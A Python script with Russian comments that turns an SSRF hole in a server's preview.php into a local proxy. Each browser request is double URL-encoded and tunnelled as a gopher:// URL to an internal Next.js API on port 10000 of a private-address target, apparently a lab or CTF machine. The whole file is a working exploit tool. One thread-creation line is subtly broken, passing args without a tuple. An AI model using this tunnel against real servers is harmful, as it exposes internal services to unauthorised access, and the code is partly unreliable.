import socket, requests, urllib.parse, threading
# Импортируем модули:
# socket - для создания TCP-сервера (прокси)
# requests - для отправки HTTP-запросов к preview.php
# urllib.parse - для URL-кодирования данных
# threading - для обработки нескольких подключений одновременно

# Настройки прокси-сервера
LHOST = '127.0.0.1'        # Адрес, на котором будет слушать прокси (только локально)
LPORT = 5555               # Порт, на котором будет слушать прокси
TARGET_HOST = "10.49.129.21"  # Целевой сервер с уязвимым preview.php
HOST_TO_PROXY = "127.0.0.1"   # Внутренний хост, к которому идём через gopher
PORT_TO_PROXY = 10000         # Внутренний порт (10000 - Next.js API)

def handle_client(conn):
    # Функция для обработки каждого подключения к прокси
    with conn:
        # conn - сокет, подключенный к браузеру
        # addr - адрес клиента (браузера)
        
        data = conn.recv(65536)
        # Получаем сырой HTTP-запрос от браузера
        # Например: "GET /customapi HTTP/1.1\r\nHost: 127.0.0.1:5555\r\n\r\n"
        
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        # Двойное URL-кодирование:
        # 1. Первое кодирование: пробелы -> %20, \r -> %0d, \n -> %0a
        # 2. Второе кодирование: % -> %25
        # Нужно, чтобы preview.php не испортил запрос при своём декодировании
        
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        # Формируем URL для SSRF:
        # Пример: http://10.49.129.21/preview.php?url=gopher://127.0.0.1:10000/_%25%32%30...
        # preview.php отправит gopher-запрос на внутренний сервер
        
        resp = requests.get(target_url)
        # Отправляем GET-запрос к preview.php (который сам делает gopher-запрос)
        # resp содержит ответ от внутреннего сервера (через preview.php)
        
        conn.sendall(resp.content)
        # Пересылаем ответ обратно в браузер (или curl)

def start_server():
    # Функция запуска прокси-сервера
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Создаём TCP-сокет (IPv4, TCP)
    
    server.bind((LHOST, LPORT))
    # Привязываем сокет к адресу 127.0.0.1:5555
    
    server.listen(5)
    # Начинаем слушать подключения (максимум 5 в очереди)
    
    print(f"[*] Listening on {LHOST}:{LPORT}")
    
    while True:
        # Бесконечный цикл приёма подключений
        
        client_socket, _ = server.accept()
        # Принимаем новое подключение от браузера
        
        client_handler = threading.Thread(target=handle_client, args=(client_socket))
        # Создаём отдельный поток для обработки этого подключения
        
        client_handler.start()
        # Запускаем поток

if __name__ == "__main__":
    start_server()
    # Если скрипт запущен напрямую (а не импортирован), запускаем сервер